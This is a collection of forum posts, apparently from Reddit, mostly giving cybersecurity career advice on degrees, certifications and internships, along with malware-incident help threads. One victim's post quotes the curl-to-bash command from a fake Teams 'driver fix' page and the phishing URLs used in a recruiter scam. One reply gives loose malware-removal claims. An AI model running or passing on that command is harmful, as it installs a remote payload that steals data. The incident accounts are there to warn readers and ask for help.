      "text": "Hello, yall. I’m currently in college for a bachelors in cybersecurity but everyone on Reddit just complains about how hard it is to break into cyber and you need 3-7 years of experience in tech and blah blah blah. So now I’m doubting my degree a little. I still want a degree but I’m worried about my future yk? So I’m wondering does getting a masters make a huge difference for job prospects or not really? Would it be worth my time to get a master?\n\nEdit/update: thank you everyone for the response. Common consensus seems to be I don’t need a masters and should focus on experience. Which I’m trying. I have my A+, about to test for my net+, and then on to sec+,ccna, and maybe some other small certs as I keep looking for any entry tech job. I might get a masters later on but that would be deep into my career perhaps. Any other thoughts please feel free to comment",

I do occasionally hire college graduates, though I’m not hiring right now.\n\nIf you put yourself in my position and you have one opening to fill, that person has to walk in ready to work on day one. They’re joining an overworked team and need to contribute quickly.\n\nNow imagine a candidate who says:  \n“I’m online with WGU. I’m not doing much outside of school. I’ve thought about building a homelab and maybe trying to job shadow. I have a job, but it’s not in tech. There aren’t many local options, even entry-level. I’m not really involved with the school since it’s online.”\n\nWould you hire that person?\n\nThat candidate wouldn’t be competing against one or two people. They’d be competing against dozens, sometimes hundreds, of applicants. Many of them already have hands-on IT experience, internships, student jobs, help desk work, or lab work they can clearly explain and defend in an interview.\n\nSo what can you do to improve your chances of getting noticed?\n\nThere is no place in this country that doesn’t have some kind of IT or tech work happening. Small businesses, local governments, hospitals, schools, manufacturers, even farms need IT support. You have to go find those opportunities.\n\nThis is one of the biggest weaknesses of fully online programs. They don’t naturally provide the resources, exposure, and networking that in-person universities do. That doesn’t mean it’s hopeless, but it does mean the burden is on you to work harder to stand out.\n\n“Thinking about doing a homelab” isn’t enough. You need real-world, in-person experience. You need to show that you can show up on time, work with other people face-to-face, take direction, accept criticism, and function in real operational environments. That’s what hiring managers are looking for, especially when the team is already stretched thin.",

          "text": "Ok, there are some common complaints about degrees that are understandable but largely come down to misunderstandings, in my opinion. Particularly in IT, a degree is not needed in order to break in. And often, in the first few years, someone who skipped college and went straight into IT will earn more than someone who went the degree route first. But this compensation gaps tends to flip after a few years for a couple reasons that I don't think get talked about much.\n\nWhile you don't need a degree to break into IT, a degree definitely cuts down on the experience requirement when you apply for roles (not in the first couple years, but once you're established it definitely makes a difference). This is less pronounced for purely technical roles, but as you progress your career and consider promotion opportunities you'll really start to notice it.\n\nSo this really breaks down into 2 different considerations: 1) Are you comfortable continuing school? 2) Do you know for sure that want to focus on security policy/compliance and/or want to work your way towards CISO type leadership roles?\n\n1) School isn't for everyone. The system is just not ideal for certain personality types. But don't jump to conclusions just because school is annoying. Are you able to focus in classrooms, get your homework done, and write term papers? Are consistently passing your classes without much difficulty? If the answers are yes, then you should probably go down the college route. But if you do have trouble staying focused in a classroom or completing your coursework, then you may want to consider going directly into IT.\n\n2) Question 2 is specifically to figure out if you should pursue a Masters degree right away. In most cases, a Masters degree will not give you a significant leg up when breaking into IT or IT Security. But down the line, if you are considering management or executive positions, a Masters degree will become a requirement. If you know now (or before you complete your Bachelors) that you really want to focus on GRC, compliance auditing, or policy writing, then in those cases a Masters can also be beneficial.\n\nIn most cases I would say don't sign up for a Master program right from highschool, unless it condenses a both a Bachelors and Masters degree into a shortened timeframe. You can always sign up for a Masters program while finishing a Bachelors degree or go back to school mid career for a Masters, but a lot of people start to feel burnout by the end of their Bachelors program.  \n  \nThere's also the financial piece to consider, but I'm of the opinion that either type of degree in a STEM field will pay for itself down the line.",

Upon graduation I went off to go do my student co-op as a solutions architect from which my program was secure software engineering.\n\nI was hired on a short term contract that lead to full time employment as a security architect - yes I’m well aware that this went far beyond against the grain and while some would say that I am lucky I ask myself all the time… was I though? When contracted I was asked to fix the organizations 4 year failed threat modelling process because I had vast knowledge for AppSec, DevSecOps and SSDLC as a result of my program. I did that, I turned around the culture and educated them and wrote literally a field manual for how to do threat modelling efficiently and effectively. I did this while apart of the security architecture team as a solutions architect and one senior sec arch was blown away and asked where the heck did I learn this stuff because he’s never seen anything like it. This is what led me to immediately be hired full time as one of them.\n\nNow comes the problems I faced. I knew software, I knew the methodologies, I knew the frameworks, I knew the tools, I knew how to code with security as the forefront. I however did not know networks, and I did not know the systems and how all those things come together. This aspect that I did not know is what is most important in cybersecurity. Now I told my director that they can find better talent than what I had to offer when they offered me full time - it did not feel good to me but my director reaffirmed that I would learn these things with time but my value was more so the development side of the house because not 1 member of the team knew it like I knew it and this is what they wanted. So I accepted.\n\nFor easily 1 year after being hired I suffered extreme anxiety, and extreme imposter syndrome and it took a long time to feel like I belonged amongst these seniors in the space. I always felt stupid and always felt I needed to leave. I couldn’t speak on the technical level the others of my team spoke on and I struggled to even sit and listen during conversations because I could not keep up.\n\nIt was terrible but my director was always ready to keep me grounded and calm my nerves.\n\nNow while my team and my director were as patient as they were and that I so desperately needed, I fathom it would be difficult for others finding themselves in a similar position would too have a team ready to support a very jr member of the team that the jr requires in order to succeed with time. Especially that by all accounts, I should never have been hired as a security architect, it was by far too senior of a role for a fresh graduate. I still cannot comprehend why take the chance on me from the directors pov.\n\nSo it is possible to expedite one’s way into cybersecurity but it will yield consequences and in my case it was my mental health for the longest time.",

For example, I got a computer engineering degree while working part-time doing tech support for the university, then worked as a Linux system administrator, went back to school for a cybersec master's degree while working as a software engineer, and now I'm a security officer for a large insurance company.\n\nAnyway, that means that to get a cybersecurity job, you probably need to get a degree in computer science or engineering first, and that will be pretty math-heavy.\n\nBut to be honest, I was in your position before I started my bachelor's, I hated maths and I was terrible at it, so don't let that stop you if IT/computer science is something you really want to do.\n\nIf you're motivated, you can get through it and I found that I even enjoyed it by the end.

You didn’t explicitly say that, but I want to clarify why it would be wrong to say so.\n\nCybersecurity is, at its core, applied computer science. To be effective in \"serious\" roles, like Exploit Development, Reverse Engineering, Cryptography, or Cloud Architecture, you need to understand memory management, kernel structures, discrete math, and networking protocols at a low level. A degree forces you to learn those fundamentals, and by professionals; certifications often just teach you how to use a tool.\nFurthermore, an engineering degree acts as a trusted proxy for problem-solving ability and grit. It tells a hiring manager that you can handle complex, abstract tasks. Sure, you can get an entry-level SOC job without a degree, but good luck getting past the HR filters for a Principal Security Engineer role with just a GitHub repo and a bootcamp certificate.",

You need to break into IT or get internships and use that to leverage your way into the field. \n\nI myself finished my degree in cybersecurity a year ago, but I made the mistake of not doing much self learning, and I didn't do any internships, so now I'm stuck doing a job unrelated to my field just to pay the bills until I can upskill my way into getting *any* IT job, which I will then use to leverage my way into cybersecurity. Or at least that's the idea.\n\nNeedless to say, it's going to take a lot of work to break into the field. Go for it if it's something you feel you'll enjoy, but just know it isn't going to be easy.",

Basic math is usually enough, like understanding percentages, logs at a very surface level, or reading numbers in reports.\n\nA lot of the work is more about problem solving, logic, reading logs, understanding how systems and networks work, and following processes. Stuff like threat analysis, incident response, SOC work, GRC, blue team, etc barely uses “school math” at all.\n\nThat said, you still need to be okay with technical concepts and learning new tools. Some areas like cryptography or data science side of security can get mathy, but those are specific niches, not the whole field. Many people in cyber were bad at math in school and still do fine. If you’re okay with computers, troubleshooting, and learning step by step, it’s still a realistic option.",

              "text": "When it comes to jobs in cyber, the market today isn’t what it was three or four years ago. Things have matured and consolidated, especially in the U.S. and other western countries. Expectations are higher now, and experience actually matters again. Most people aren’t walking straight out of college into a pure “cyber” role anymore. Some do, but they’re the exception, not the rule. To really succeed in cyber, you need a solid technical foundation first.\n\nIf you’ve never worked with networks or really understand how systems talk to each other, how are you going to make sense of alerts in a SOC? Are employers supposed to teach you all of that on the job? They usually won’t, because there are hundreds of applicants who already have that experience and can contribute on day one.\n\nSame thing with DFIR. If you don’t understand how Windows and Linux log activity, how data is stored, how the registry works, what event logs are telling you, or how systems behave in memory, it’s going to be really hard to step into that role and be effective. That knowledge doesn’t come from theory alone.\n\nThe reality is that most tech jobs have some cybersecurity built into them. Help desk, system admin, and network admin roles are where a lot of people actually learn “cyber” without the title. That’s where you deal with accounts, permissions, Active Directory, Linux file access, locking down servers, rebuilding old or vulnerable systems, and cleaning up real-world messes. That’s the foundation.\n\nAnd that foundation is what lets you move into cybersecurity later and actually be good at it. So when you’re job hunting, don’t narrow your search too much. Cast a wide net. A lot of solid cyber careers start in roles that don’t have “cybersecurity” in the title at all.",

Let me know what is in there, it'll help me smell if anything is weird about it.\n\nDownload autoruns from sysinternals; look through all the tabs, do you notice anything that smells weird?

Discussions were smooth and he shared with me his Calendly in order to book an initial discussion about the role, the team etc (standard practice)\n\nHe shared with me a link to join the video call, which was \\`https://bitget-meeting.com/meet/934050553811?p=2eFFrUchalpVywTExG\\`.  I joined the call and the environment was identical to MS Teams. He joined after 3 mins but the video was frozen. I got a popup saying that you might have to install a driver to properly show video and audio for MS Teams. I stupidly clicked on the link \\`https://learn.bitget-meeting.com/en-us/troubleshoot/microsoftteams/teams-on-mac/teams-audio-issue-mac\\`, which was identical again to Microsoft webpages, and executed the following\n\n    /bin/bash -c \"$(curl -fsSL https://apple.driver-update.io/troubleshoot/mac/audio-issue-fix.sh)\"\n\nThe recruiter asked me for my phone number to call me and I had a 20 mins discussion about the role with an AI bot...\n\nAfter I stopped talking to it, I froze. I understood what I had done and decided to wipe the script and the downloaded binary from everywhere. ChatGPT was very helpful with the process and immediately identified that this script does indeed look harmful.\n\nI would like to ask you what more can I do to make sure that the downloaded binary did not install anything on my machine or my browser that might exfiltrate data? I have already checked:\n\n* Brave extensions\n* Removed the folder created by the sh script\n* I deleted the \\`coreaudiod\\` file. It cannot be found anywhere on my machine. No mention of \\`apple.driver-update.io\\` driver\n* No weird LaunchAgents or LaunchDaemons\n* Uninstalled Teams and Zoom (should have done this a long time ago)\n* Installed LuLu, NetIQuette and KnockKnock (no weird things there)",

It was located in C:/Program Files (x86)/Windows Service/. As far as I know, “Windows Service” is not a default Windows folder, and if I had downloaded ScreenConnect, I would have had no reason to place it there or name it that way.\n\nThe download date was from June. I haven’t had any security issues since then, so I assume this was the first time it tried to run during a restart.\n\nI didn’t have much of importance on my laptop—only a few files I wanted to keep and might revisit. I reset the laptop and reinstalled Windows 11 using a cloud install. But is that enough? I’ve read that rootkits like this can reinstall themselves even after a Windows reinstall.\n\nI’m a total novice when it comes to cybersecurity, and I’ve been extremely anxious about this over the past couple of days. I’ve been checking my laptop after every restart, and no ScreenConnect/ConnectWise files have appeared again, but I just want to be extra sure. Otherwise, I’ll be agonizing over this until I eventually replace the laptop.\n\nI also uninstalled my Remote Desktop Connection app. I know that’s probably unrelated—it was mostly for peace of mind.\n\nEdit: I also updated my BIOS/UEFI\n\nThank you!

However you could be around 80% confident that it'll remove the virus because reformating the drive will delete even the windows kernal and everything. Otherwise, if you are ok with it, the only way to fully know that the root kit is gone is by destroying the device entirely. If the malware infects on the hardware or BIOS level, destruction is the only option as the malware will persist through OS installs. However, if it's kernal level or below like most malware is, then reinstallation after reformating will work. \n\nAlthough these are the nuclear option, if you want a way that may work without reinstalling windows, Id say take a look at the Tron script, it's comprehensive enough to remove most malware from my experience",

      "text": "I’m a college student trying to decide between two internship paths and would appreciate some outside perspective.\n\nI recently received an offer through a federal civilian internship program. The role is officially an IT student trainee position, based on system administration and general IT work in a secure government environment. It is in person, tied to a military base, and includes a security clearance path. Long-term, it can potentially lead to a full-time federal role, but the work itself is more IT-focused rather than a dedicated cybersecurity position.\n\nAt the same time, I’ve been offered a private-sector internship that is explicitly a cybersecurity internship. The work would involve hands-on security tasks and tools, and the role aligns directly with information security. I previously completed an IT internship, so this private-sector role feels like a more direct continuation into cyber.\n\nMy main dilemma is choosing between:\n\n\t•\tA cybersecurity-specific internship with more direct hands-on security experience\n\n\t•\tA federal IT role with clearance, stability, and long-term government/defense career leverage, but less guaranteed cyber depth\n\nI’m interested in cybersecurity long-term, but I’m also trying to think strategically about career leverage, not just job titles. I already have general IT experience, which is why I’m torn.\n\nFor people who’ve been in similar situations or have experience in government vs private-sector cyber, how would you weigh this decision early in your career?",

From what I've seen, they often mention how students have very little experience in actual \"cyber security\". You should look on LinkedIn at other students who have had internships at those same places possibly and ask if they have some time (give exact time like 10 min or something) to ask about their internship there and their experience. Ask who they worked with and so on.\n\nYou could also research others who were in the \"goal\" roles of said positions, if they're available to view on social and see how long they've been there.\n\nYou should always go for experience for the role you want. While there, use that as an opportunity to build really good relationships and ask them about their career path. In general, since cybersecurity is more specialized and since, its competitive to even get a job to get that experience, it's going to be the better route.\n\nHowever, even after learning all the info you get...learn to trust your gut instinct. The more you get in tune with this and if you actually measure what does it means to have a \"gut feeling\" and when, you will familiarize yourself in choosing the right path, no matter where you go. So, trust your gut.",

There is a whole world of opportunity available to you in govtech that is essentially walled off to those without a clearance, and since it isn’t something you can get on your own (sponsorship is required), you are adding yourself to a short list of candidates for future opportunities.\n\nAnd here’s part two of why I would do it…you can always determine you don’t like the government sector and bolt for the civilian world.  No harm, no foul besides a missed cyber-specific internship.  You can hate the bureaucracy of being a government civilian and still utilize the clearance as a contractor where there is much less red tape, or once you are “in” you can look for lateral transfers into cyber.  \n\nAnd anecdotally…I know quite a few people who were great IT professionals who jumped at their first chance for a cybersecurity role and found out the hard way that the vast majority of cyber roles are not hands-on keyboard operators who are spending more time in Microsoft Excel than they are tools of the trade…and once they had that realization, they resigned their positions and moved back into the administration/engineering side of the house.\n\nBest of luck no matter what you choose.",

      "text": "So, I have to make this final year project for the last year of my cyber security degree, at first I was very motivated to make something new something unique for my FYP and decided to make an AI based NIDS system, that will comprise of 4 AI algorithms, 2 supervised, decision tree and random forest, and 2 unsupervised, isolation forest and autoencoders.\nFor the first part of the FYP I had to make the supervised part for which I took NIDS dataset from university of queens website and trained the models on the 2 algorithms.\nNow me having no idea or knowledge about AI somehow managed to make the thing an make it look like it was working which it is to some extent, it is basically 2 pkl files which predict the whether the packet is an attack packet or benign.\nWhich I think was not the right way to it, and could have been done in a way that the model still keeps on learning on the new packets it was receiving after it was trained on the initial dataset.\nNow I have to work on the unsupervised part of the project and the whole IDS, and again I know I will have to watch 100s and 100s of tutorial read 100s of theories on it and somehow I will manage to make it work in the end but I don't really want to do it like that again because it was such a hassle.\nSo I wanted to know if there is like a similar open source project, similar to the one described above, which I can tweak and reshape into what I have to present, or if there is any tutorial(s) that I can watch and work along to make the project.\nOr any other help or suggestion anyone can give me on how I should make this project would be very helpful and appreciate.",
